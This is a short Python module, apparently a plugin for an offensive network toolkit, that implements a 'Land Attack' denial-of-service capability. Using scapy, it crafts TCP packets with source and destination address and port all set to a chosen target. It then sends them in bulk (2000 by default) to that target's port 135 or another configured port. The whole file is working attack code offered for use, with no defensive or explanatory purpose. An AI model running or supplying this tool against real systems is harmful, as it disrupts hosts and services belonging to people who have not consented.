from scapy.all import IP, TCP, send
from capability import *

class Land(Capability):
    def __init__(self, core):
        super(Land, self).__init__(core)
        self.name = "Land Attack"
        self.options = {
                "port"   : Option("port", 135, "port to attack", True),
                "target" : Option("target", "0.0.0.0", "machine to target", True),
                "size" : Option("size", 2000, "how loud (and effective) the attack is", False)
                }
        self.help_text = INFO + "Launches a Land DOS flood attack packet."

    def launch(self):
        send(IP(src=self.get_value("target"), dst=self.get_value("target"))/TCP(sport=self.get_value("port"), dport=self.get_value("port")), count=self.get_value("size"))
